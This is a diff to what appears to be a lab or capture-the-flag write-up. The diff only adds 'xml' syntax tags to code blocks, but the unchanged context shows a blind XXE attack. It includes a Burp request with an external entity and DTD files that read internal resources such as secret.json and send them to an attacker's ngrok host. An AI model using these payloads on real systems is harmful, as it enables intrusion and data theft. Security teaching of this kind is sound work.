@@ -192,7 +192,7 @@ First lets look at how the request should be crafted. In Burp Suite, find the re
 
 Go to the repeater tab and then replace everything after `Connection: close` in the raw request with: 
 
-```
+```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [ <!ELEMENT foo ANY >
 <!ENTITY % xxe SYSTEM "http://275d42ab779c.ngrok.io/mal.dtd" > %xxe;] >
@@ -213,7 +213,7 @@ Command to start python server: `python3 -m http.server`
 
 The malicious dtd file should look like this: 
 
-```
+```xml
 <!ENTITY % file SYSTEM "http://secret_server/">
 <!ENTITY % eval "<!ENTITY exfiltrate SYSTEM 'http://275d42ab779c.ngrok.io/?x=%file;'>">
 %eval;
@@ -234,7 +234,7 @@ Examining this response we can see that our exploit was successful. The second W
 
 Lets change our dtd to grab the contents of that directory: 
 
-```
+```xml
  <!ENTITY % file SYSTEM "http://secret_server/data">
  <!ENTITY % eval "<!ENTITY exfiltrate SYSTEM 'http://275d42ab779c.ngrok.io/?x=%file;'>">
  %eval;
@@ -248,7 +248,7 @@ Lets change our dtd to grab the contents of that directory:
 
  Changing the dtd to grab that file: 
 
- ```
+ ```xml
   <!ENTITY % file SYSTEM "http://secret_server/data/secret.json">
  <!ENTITY % eval "<!ENTITY exfiltrate SYSTEM 'http://275d42ab779c.ngrok.io/?x=%file;'>">
  %eval;
